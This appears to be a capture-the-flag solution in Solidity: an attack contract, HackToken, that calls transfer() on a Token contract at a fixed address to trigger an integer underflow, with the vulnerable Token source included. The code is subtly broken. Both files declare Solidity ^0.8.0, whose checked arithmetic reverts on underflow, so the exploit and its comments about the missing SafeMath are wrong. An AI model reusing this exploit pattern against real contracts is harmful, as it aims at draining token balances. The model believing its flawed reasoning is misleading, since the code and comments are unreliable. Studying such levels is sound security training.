// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Token.sol';

contract HackToken {
    // Complete this value with the address of the instance
    Token public originalContract = Token(0xC1f55dBb59b731AaACE60f4c692bEAE7caa85169);

    function generateUnderflow() public {
        // If we transfer 21 because it's not using safeMath it's going to cause an underflow
        // We use the address of the instance but it could be any address except mine
        originalContract.transfer(0xC1f55dBb59b731AaACE60f4c692bEAE7caa85169, 21);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}